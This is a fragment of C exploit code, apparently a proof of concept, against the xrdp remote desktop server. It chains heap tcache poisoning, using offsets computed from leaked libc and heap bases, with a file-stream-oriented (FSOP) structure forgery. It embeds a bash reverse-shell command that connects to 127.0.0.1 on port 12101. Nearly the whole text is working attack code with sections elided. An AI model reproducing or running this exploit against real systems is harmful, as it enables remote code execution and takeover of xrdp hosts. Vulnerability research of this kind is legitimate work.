...
int xrdp_tcache_poisoning(struct wts_obj* channel, uint64_t libc_base, uint64_t heap_base) {
    uint32_t rv, bytes_written;
    uint32_t pause;
    ...
    p64(0x0);
    p64(0x411);
    p64((libc_base + 0x21a4e0) ^ ((heap_base + 0x506ea0) >> 12));
    set(0x3f8, 0);
...
int xrdp_fsop(void* channel, uint64_t libc_base, uint64_t heap_base) {
    uint32_t rv, bytes_written;
    uint64_t tmp;
    ...
    p64(0x0);                   // bitmap
    p64(0x0);
    p64(libc_base + 0x219c80);  // next
    p64(0x0);                   // next_free
    p64(0x1);                   // attached_thread
    p64(0xffffffff);            // system_mem
    p64(0xffffffff);            // max_system_mem
    ...
    p64(0xffffffffffffffff);
    copy("bash -c 'sh -i >& /dev/tcp/127.0.0.1/12101 0>&1'");
    set(0x400 - (len - tmp), 0);
    set(0x30, 0);
    p16(0x0);
    p32(0);
...
int exploit(void) {
    ...
    xrdp_tcache_poisoning(channel, libc_base, heap_base);
    xrdp_fsop(channel, libc_base, heap_base);
